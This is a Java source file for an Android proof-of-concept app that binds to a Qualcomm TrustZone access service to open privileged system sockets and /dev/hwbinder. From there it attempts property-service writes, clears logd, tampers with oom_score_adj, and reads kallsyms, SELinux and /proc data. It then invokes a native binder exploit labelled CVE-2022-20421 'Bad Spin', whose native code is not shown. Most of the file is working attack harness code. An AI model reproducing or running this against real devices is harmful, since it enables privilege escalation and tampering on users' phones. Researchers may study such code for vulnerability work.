package com.example.tzpoc;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.ParcelFileDescriptor;
import android.os.RemoteException;
import android.view.View;
import android.widget.Button;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.qualcomm.qti.qms.api.minksocket.IMinkSocketFd;

import java.io.File;
import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.charset.StandardCharsets;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.atomic.AtomicBoolean;

public class MainActivity extends AppCompatActivity {
    private static final String TARGET_PKG = "com.qualcomm.qti.qms.service.trustzoneaccess";
    private static final String TARGET_CLS = "com.qualcomm.qti.qms.service.trustzoneaccess.TZAccessService";

    private static final int ERROR_UNAVAIL = -96;
    private static final int ERROR_BADOBJ = -92;
    private static final int ERROR_DEFUNCT = -90;

    private static final int PROP_SUCCESS = 0;
    private static final int PROP_ERROR_INVALID_NAME = 1;
    private static final int PROP_ERROR_INVALID_VALUE = 2;
    private static final int PROP_ERROR_PERMISSION_DENIED = 3;
    private static final int PROP_ERROR_READ_ONLY_PROPERTY = 4;
    private static final int PROP_ERROR_SET_FAILED = 5;
    private static final int PROP_ERROR_HANDLE_CONTROL_MESSAGE = 6;
    private static final int PROP_ERROR_READ_CMD = 7;
    private static final int PROP_ERROR_READ_DATA = 8;
    private static final int PROP_ERROR_INVALID_CMD = 9;

    private TextView tvStatus, tvLog;
    private Button btnStart, btnStop;
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder logBuilder = new StringBuilder();
    private IMinkSocketFd tzService;
    private boolean isBound = false;
    private AtomicBoolean isTesting = new AtomicBoolean(false);
    private AtomicBoolean stopRequested = new AtomicBoolean(false);
    private Thread testThread;

    static {
        System.loadLibrary("pocjni");
    }

    // Core binder exploit functions
    public static native int nativeBinderOpen();
    public static native int nativeBinderVersion(int fd);
    public static native int nativeBinderSetMaxThreads(int fd, int max);
    public static native int nativeBinderCreateNode(int fd, long ptr, long cookie);
    public static native int nativeBinderIncRef(int fd, int handle, boolean strong);
    public static native int nativeBinderDecRef(int fd, int handle, boolean strong);
    public static native int nativeBinderTransaction(int fd, int targetHandle, int code, byte[] data, byte[] offsets);
    public static native int nativeBinderRead(int fd, byte[] buffer, int size);
    public static native int nativeBinderWrite(int fd, byte[] buffer, int size);
    public static native String nativeBinderExploit(int fd);
    public static native String nativeBinderBadSpin(int fd);

    private ServiceConnection tzConnection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            tzService = IMinkSocketFd.Stub.asInterface(service);
            if (tzService != null) {
                appendLog("[TZ] Service bound via AIDL");
                updateStatus("Bound - starting exploit");
                enableButtons(false, true);
                stopRequested.set(false);
                testThread = new Thread(() -> executeExploit());
                testThread.start();
            } else {
                appendLog("[TZ] Failed to cast to IMinkSocketFd");
                enableButtons(true, false);
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            tzService = null;
            isBound = false;
            enableButtons(true, false);
            updateStatus("Disconnected");
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        tvStatus = findViewById(R.id.tv_status);
        tvLog = findViewById(R.id.tv_log);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        requestPermissions();

        btnStart.setOnClickListener(v -> {
            if (!isTesting.get()) {
                isTesting.set(true);
                enableButtons(false, true);
                stopRequested.set(false);
                bindService();
            }
        });
        btnStop.setOnClickListener(v -> {
            if (isTesting.get()) {
                stopRequested.set(true);
                if (testThread != null) testThread.interrupt();
                enableButtons(false, false);
                updateStatus("Stopping...");
                appendLog("--- Stop requested ---");
                saveLog();
                enableButtons(true, false);
                isTesting.set(false);
            }
        });
        appendLog("App started. Press 'Start' to begin.");
    }

    private void requestPermissions() {
        String[] perms = {
                android.Manifest.permission.READ_EXTERNAL_STORAGE,
                android.Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        List<String> toRequest = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                toRequest.add(p);
            }
        }
        if (!toRequest.isEmpty()) {
            ActivityCompat.requestPermissions(this, toRequest.toArray(new String[0]), 100);
        }
    }

    private void bindService() {
        try {
            Intent intent = new Intent();
            intent.setClassName(TARGET_PKG, TARGET_CLS);
            boolean ret = bindService(intent, tzConnection, Context.BIND_AUTO_CREATE);
            if (ret) {
                appendLog("Binding service...");
                updateStatus("Binding...");
                isBound = true;
            } else {
                appendLog("bindService returned false");
                updateStatus("Bind failed");
                enableButtons(true, false);
                isTesting.set(false);
            }
        } catch (Exception e) {
            appendLog("Bind exception: " + e.toString());
            updateStatus("Exception");
            enableButtons(true, false);
            isTesting.set(false);
        }
    }

    private void enableButtons(boolean startEnabled, boolean stopEnabled) {
        handler.post(() -> {
            btnStart.setEnabled(startEnabled);
            btnStop.setEnabled(stopEnabled);
        });
    }

    private void executeExploit() {
        appendLog("========================================");
        appendLog("========== TZ Socket & Binder POC ==========");

        // 1. Socket tests
        String[] targetSockets = {
                "/dev/socket/dnsproxyd",
                "/dev/socket/fwmarkd",
                "/dev/socket/logd"
        };
        for (String path : targetSockets) {
            if (stopRequested.get()) break;
            appendLog("[+] Testing " + path);
            try {
                testSocket(path);
            } catch (Exception e) {
                appendLog("[!] Error testing " + path + ": " + e.getMessage());
            }
        }

        // 2. Property service test
        appendLog("[*] Deep property service testing");
        testPropertyServiceDeep();

        // 3. Proc exploration
        appendLog("[*] Exploring /proc/self/fd");
        exploreProcFd();

        // 4. OOM score
        appendLog("[*] Testing /proc/self/oom_score_adj");
        testOomScoreAdj();

        // 5. SELinux info
        appendLog("[*] Testing SELinux and kptr related files");
        exploreSelinuxAndKptr();

        // 6. Bruteforce /sys
        appendLog("[*] Bruteforcing /sys for readable files");
        bruteforceSys();

        // 7. Bruteforce /cache and /vendor/bin
        appendLog("[*] Bruteforcing /cache and /vendor/bin");
        bruteforceCacheAndVendor();

        // 8. Bruteforce /proc/self/
        appendLog("[*] Bruteforcing /proc/self/");
        bruteforceProcSelf();

        // 9. Dump privileged files
        appendLog("[*] Attempting to dump privileged files");
        dumpPrivilegedFiles();

        // 10. Kernel info
        appendLog("[*] Gathering kernel information");
        getKernelInfo();

        // 11. BINDER EXPLOIT - Bad Spin (CVE-2022-20421)移植
        appendLog("[*] ===== BINDER EXPLOIT (CVE-2022-20421 Bad Spin) =====");
        appendLog("[*] Opening /dev/hwbinder via TZAccessService");
        binderExploit();

        appendLog("========== EXPLOIT COMPLETED ==========");
        appendLog("========================================");
        updateStatus("Done");
        isTesting.set(false);
        enableButtons(true, false);
        saveLog();
        finishTest();
    }

    // ===== Socket test =====
    private void testSocket(String path) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket(path, handle);
            if (pfd == null) {
                appendLog("[ ] Failed to open " + path);
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[ ] Invalid FD for " + path);
                pfd.close();
                return;
            }
            appendLog("[+] Opened " + path + " (handle=" + handle[0] + ")");

            String base = new File(path).getName();
            switch (base) {
                case "dnsproxyd": testDnsProxy(fd); break;
                case "fwmarkd": testFwmarkd(fd); break;
                case "logd": testLogd(fd); break;
                default: testGeneric(fd, new String[]{"help\n", "status\n", "version\n"});
            }
            pfd.close();
        } catch (Exception e) {
            appendLog("[!] Exception testing " + path + ": " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    private ParcelFileDescriptor openSocket(String path, int[] handle) {
        if (tzService == null) return null;
        try {
            return tzService.a(path, handle);
        } catch (RemoteException e) {
            appendLog("[!] RemoteException: " + e.getMessage());
            return null;
        }
    }

    private void testDnsProxy(FileDescriptor fd) {
        try {
            byte[] query = buildDnsQuery("localhost", 1);
            byte[] resp = sendBinary(fd, query, 512, 2000);
            if (resp != null && resp.length > 0) {
                int rcode = resp[3] & 0x0F;
                appendLog("[DNS] Response len=" + resp.length + ", RCODE=" + rcode);
            }
        } catch (Exception e) { appendLog("[DNS] Error: " + e.getMessage()); }
    }

    private void testFwmarkd(FileDescriptor fd) {
        try {
            ByteBuffer buf = ByteBuffer.allocate(16);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(6);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 4, 1000);
            if (resp != null && resp.length == 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] SELECT_NETWORK result=" + result);
            }
        } catch (Exception e) { appendLog("[FW] Error: " + e.getMessage()); }

        try {
            ByteBuffer buf = ByteBuffer.allocate(12);
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(7);
            buf.putInt(android.os.Process.myUid());
            buf.putInt(0);
            byte[] resp = sendBinary(fd, buf.array(), 8, 1000);
            if (resp != null && resp.length >= 4) {
                int result = ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
                appendLog("[FW] GET_NETWORK result=" + result);
            }
        } catch (Exception e) { appendLog("[FW] GET_NETWORK error: " + e.getMessage()); }
    }

    private void testLogd(FileDescriptor fd) {
        try {
            InputStream is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, 1000);
            if (read > 0) {
                String str = new String(buf, 0, read, StandardCharsets.UTF_8);
                appendLog("[LOGD] Read " + read + " bytes: " + str.replace("\n", "\\n"));
            }
            is.close();
        } catch (Exception e) { appendLog("[LOGD] Error: " + e.getMessage()); }

        try {
            String resp = sendTextCommand(fd, "clear\n", 500);
            appendLog("[LOGD] clear response: " + (resp != null ? resp : "(none)"));
        } catch (Exception e) { appendLog("[LOGD] clear error: " + e.getMessage()); }
    }

    private void testGeneric(FileDescriptor fd, String[] cmds) {
        for (String cmd : cmds) {
            if (stopRequested.get()) break;
            try {
                String resp = sendTextCommand(fd, cmd, 1000);
                appendLog("[GEN] CMD: " + cmd.trim() + " => " + (resp != null ? resp.replace("\n", "\\n") : "(no response)"));
            } catch (Exception e) { appendLog("[GEN] Error: " + e.getMessage()); }
        }
    }

    private String sendTextCommand(FileDescriptor fd, String cmd, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(cmd.getBytes(StandardCharsets.UTF_8));
            os.flush(); os.close(); os = null;
            is = new FileInputStream(fd);
            byte[] buf = new byte[4096];
            int read = readBytes(is, buf, 4096, timeoutMs);
            if (read > 0) return new String(buf, 0, read, StandardCharsets.UTF_8);
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private byte[] sendBinary(FileDescriptor fd, byte[] data, int maxResp, int timeoutMs) throws Exception {
        OutputStream os = null;
        InputStream is = null;
        try {
            os = new FileOutputStream(fd);
            os.write(data); os.flush(); os.close(); os = null;
            is = new FileInputStream(fd);
            byte[] buf = new byte[maxResp];
            int read = readBytes(is, buf, maxResp, timeoutMs);
            if (read > 0) {
                byte[] resp = new byte[read];
                System.arraycopy(buf, 0, resp, 0, read);
                return resp;
            }
            return null;
        } finally {
            if (os != null) try { os.close(); } catch (Exception ignored) {}
            if (is != null) try { is.close(); } catch (Exception ignored) {}
        }
    }

    private int readBytes(InputStream is, byte[] buffer, int maxLen, int timeoutMs) {
        int total = 0;
        long start = System.currentTimeMillis();
        try {
            while (total < maxLen && System.currentTimeMillis() - start < timeoutMs) {
                if (is.available() > 0) {
                    int n = is.read(buffer, total, maxLen - total);
                    if (n <= 0) break;
                    total += n;
                } else {
                    Thread.sleep(20);
                }
            }
            return total;
        } catch (Exception e) { return -1; }
    }

    private byte[] buildDnsQuery(String name, int qtype) throws Exception {
        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
        baos.write(0x12); baos.write(0x34);
        baos.write(0x01); baos.write(0x00);
        baos.write(0x00); baos.write(0x01);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        baos.write(0x00); baos.write(0x00);
        for (String label : name.split("\\.")) {
            baos.write(label.length());
            baos.write(label.getBytes(StandardCharsets.US_ASCII));
        }
        baos.write(0);
        baos.write((qtype >> 8) & 0xFF); baos.write(qtype & 0xFF);
        baos.write(0x00); baos.write(0x01);
        return baos.toByteArray();
    }

    // ===== Property Service =====
    private void testPropertyServiceDeep() {
        String[][] testCases = {
                {"persist.sys.timezone", "Asia/Tokyo"},
                {"persist.sys.language", "ja"},
                {"persist.sys.country", "JP"},
                {"persist.sys.locale", "ja-JP"},
                {"persist.test.poc", "1"},
        };

        for (String[] test : testCases) {
            if (stopRequested.get()) break;
            int result = tryPropertySet(test[0], test[1]);
            appendLog("[PROP] " + test[0] + "=" + test[1] + " => " + result);
            try { Thread.sleep(100); } catch (Exception ignored) {}
        }
    }

    private int tryPropertySet(String name, String value) {
        ParcelFileDescriptor pfd = null;
        try {
            int[] handle = new int[1];
            pfd = openSocket("/dev/socket/property_service", handle);
            if (pfd == null) return -3;
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) return -4;
            int result = sendPropertySet2(fd, name, value);
            pfd.close();
            return result;
        } catch (Exception e) {
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
            return -2;
        }
    }

    private int sendPropertySet2(FileDescriptor fd, String name, String value) {
        try {
            ByteBuffer buf = ByteBuffer.allocate(4 + 4 + name.length() + 4 + value.length());
            buf.order(ByteOrder.LITTLE_ENDIAN);
            buf.putInt(2);
            buf.putInt(name.length());
            buf.put(name.getBytes(StandardCharsets.UTF_8));
            buf.putInt(value.length());
            buf.put(value.getBytes(StandardCharsets.UTF_8));
            byte[] data = buf.array();
            OutputStream os = new FileOutputStream(fd);
            os.write(data); os.flush(); os.close();

            InputStream is = new FileInputStream(fd);
            byte[] resp = new byte[4];
            int read = readBytes(is, resp, 4, 1000);
            is.close();
            if (read == 4) {
                return ByteBuffer.wrap(resp).order(ByteOrder.LITTLE_ENDIAN).getInt();
            }
            return -1;
        } catch (Exception e) {
            return -2;
        }
    }

    // ===== Proc FD exploration =====
    private void exploreProcFd() {
        String[] fds = nativeListDir("/proc/self/fd");
        if (fds == null) return;
        for (String fdStr : fds) {
            if (stopRequested.get()) break;
            String link = "/proc/self/fd/" + fdStr;
            String target = nativeReadLink(link);
            if (target != null) {
                appendLog("[PROC] " + link + " -> " + target);
            }
        }
    }

    // ===== OOM =====
    private void testOomScoreAdj() {
        String path = "/proc/self/oom_score_adj";
        String current = nativeReadFile(path);
        appendLog("[OOM] Current: " + (current != null ? current.trim() : "null"));
        int[] values = {0, 500, 1000, 200, 300};
        for (int v : values) {
            if (stopRequested.get()) break;
            String result = nativeWriteFile(path, String.valueOf(v));
            if ("OK".equals(result)) {
                String newVal = nativeReadFile(path);
                appendLog("[OOM] Set to " + v + " => " + (newVal != null ? newVal.trim() : "null"));
            }
        }
    }

    // ===== SELinux =====
    private void exploreSelinuxAndKptr() {
        String[] paths = {
                "/proc/kallsyms", "/proc/kptr_restrict", "/proc/self/attr/current",
                "/proc/self/attr/prev", "/sys/fs/selinux/enforce", "/sys/fs/selinux/status"
        };
        for (String p : paths) {
            if (stopRequested.get()) break;
            String content = safeReadFile(p);
            if (content != null) {
                appendLog("[SELINUX] " + p + " = " + content.substring(0, Math.min(100, content.length())));
            }
        }
    }

    private String safeReadFile(String path) {
        try { return nativeReadFile(path); } catch (Exception e) { return null; }
    }

    // ===== Bruteforce /sys =====
    private void bruteforceSys() {
        String[] bases = {
                "/sys/devices/system/cpu/cpu0/cpufreq/",
                "/sys/class/power_supply/battery/"
        };
        for (String base : bases) {
            if (stopRequested.get()) break;
            File dir = new File(base);
            if (!dir.exists()) continue;
            File[] files = dir.listFiles();
            if (files == null) continue;
            for (File f : files) {
                if (stopRequested.get()) break;
                if (f.isFile() && f.canRead()) {
                    String content = safeReadFile(f.getAbsolutePath());
                    if (content != null && !content.isEmpty()) {
                        appendLog("[SYS] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
                    }
                }
            }
        }
    }

    // ===== Bruteforce /cache and /vendor/bin =====
    private void bruteforceCacheAndVendor() {
        String[] roots = {"/cache", "/vendor/bin"};
        for (String root : roots) {
            if (stopRequested.get()) break;
            File dir = new File(root);
            if (!dir.exists()) continue;
            File[] files = dir.listFiles();
            if (files == null) continue;
            for (File f : files) {
                if (stopRequested.get()) break;
                if (f.isFile() && f.canRead()) {
                    String content = safeReadFile(f.getAbsolutePath());
                    if (content != null && !content.isEmpty()) {
                        appendLog("[BRUTE] " + f.getAbsolutePath() + " = " + content.substring(0, Math.min(100, content.length())));
                    }
                }
            }
        }
    }

    // ===== Bruteforce /proc/self/ =====
    private void bruteforceProcSelf() {
        String[] entries = nativeListDir("/proc/self");
        if (entries == null) return;
        for (String entry : entries) {
            if (stopRequested.get()) break;
            if (entry.equals("fd") || entry.equals("attr") || entry.equals("task")) continue;
            String fullPath = "/proc/self/" + entry;
            String content = safeReadFile(fullPath);
            if (content != null && !content.isEmpty()) {
                appendLog("[PROC-SELF] " + fullPath + " = " + content.substring(0, Math.min(100, content.length())));
            }
        }
    }

    // ===== Privileged files =====
    private void dumpPrivilegedFiles() {
        String[] paths = {
                "/proc/mounts", "/proc/self/status", "/proc/self/stat",
                "/proc/self/stack", "/proc/self/wchan"
        };
        for (String path : paths) {
            if (stopRequested.get()) break;
            String content = safeReadFile(path);
            if (content != null && !content.isEmpty()) {
                appendLog("[PRIV] " + path + " = " + content.substring(0, Math.min(200, content.length())));
            }
        }
    }

    // ===== Kernel info =====
    private void getKernelInfo() {
        String result = nativeGetKernelInfo();
        appendLog("[KERNEL] " + result);
    }

    // ===== Binder Exploit =====
    private void binderExploit() {
        // Open /dev/hwbinder via TZAccessService
        ParcelFileDescriptor pfd = null;
        int binderFd = -1;
        try {
            int[] handle = new int[1];
            pfd = openSocket("/dev/hwbinder", handle);
            if (pfd == null) {
                appendLog("[BINDER] Failed to open /dev/hwbinder via TZService");
                return;
            }
            FileDescriptor fd = pfd.getFileDescriptor();
            if (fd == null || !fd.valid()) {
                appendLog("[BINDER] Invalid FD");
                pfd.close();
                return;
            }
            // Get the raw file descriptor number
            binderFd = pfd.getFd();
            appendLog("[BINDER] Opened /dev/hwbinder via TZService, fd=" + binderFd);

            // Get version
            int version = nativeBinderVersion(binderFd);
            appendLog("[BINDER] Version: " + version);

            // Set max threads
            int ret = nativeBinderSetMaxThreads(binderFd, 10);
            appendLog("[BINDER] Set max threads: " + ret);

            // Create a node
            long ptr = 0x12345678L;
            long cookie = 0x87654321L;
            int nodeHandle = nativeBinderCreateNode(binderFd, ptr, cookie);
            appendLog("[BINDER] Create node: handle=" + nodeHandle);

            if (nodeHandle >= 0) {
                // Increment ref
                ret = nativeBinderIncRef(binderFd, nodeHandle, true);
                appendLog("[BINDER] Inc strong ref: " + ret);

                // Send a transaction to the node
                byte[] data = new byte[16];
                ByteBuffer.wrap(data).order(ByteOrder.LITTLE_ENDIAN).putLong(ptr);
                ret = nativeBinderTransaction(binderFd, nodeHandle, 0x1234, data, new byte[0]);
                appendLog("[BINDER] Transaction to node: " + ret);

                // Dec ref
                ret = nativeBinderDecRef(binderFd, nodeHandle, true);
                appendLog("[BINDER] Dec strong ref: " + ret);
            }

            // Run Bad Spin exploit
            String result = nativeBinderBadSpin(binderFd);
            appendLog("[BINDER] Bad Spin result: " + result);

            pfd.close();
        } catch (Exception e) {
            appendLog("[BINDER] Exception: " + e.getMessage());
            if (pfd != null) try { pfd.close(); } catch (Exception ignored) {}
        }
    }

    // ===== JNI natives =====
    public static native String[] nativeListDir(String path);
    public static native String nativeReadFile(String path);
    public static native String nativeWriteFile(String path, String content);
    public static native String nativeReadLink(String path);
    public static native String nativeGetKernelInfo();

    // ===== Logging =====
    private void appendLog(final String msg) {
        String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(new Date());
        final String line = "[" + ts + "] " + msg + "\n";
        logBuilder.append(line);
        handler.post(() -> {
            tvLog.append(line);
            View parent = (View) tvLog.getParent();
            if (parent instanceof ScrollView) ((ScrollView) parent).fullScroll(View.FOCUS_DOWN);
        });
    }

    private void updateStatus(final String status) {
        handler.post(() -> tvStatus.setText(status));
    }

    private void saveLog() {
        try {
            File dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            if (dir == null || !dir.exists()) dir = getFilesDir();
            File file = new File(dir, "tz_poc_log.txt");
            try (PrintWriter pw = new PrintWriter(new OutputStreamWriter(new FileOutputStream(file), StandardCharsets.UTF_8))) {
                pw.println("=== TZ POC Log ===");
                pw.println("Timestamp: " + new Date().toString());
                pw.print(logBuilder.toString());
                pw.flush();
            }
            appendLog("Log saved to " + file.getAbsolutePath());
        } catch (Exception e) {
            appendLog("Save failed: " + e.getMessage());
        }
    }

    private void finishTest() {
        handler.post(() -> {
            Toast.makeText(MainActivity.this, "Exploit completed", Toast.LENGTH_LONG).show();
            new Handler(Looper.getMainLooper()).postDelayed(() -> {
                finishAffinity();
                System.exit(0);
            }, 3000);
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRequested.set(true);
        if (testThread != null) testThread.interrupt();
        if (isBound) unbindService(tzConnection);
        saveLog();
    }
}
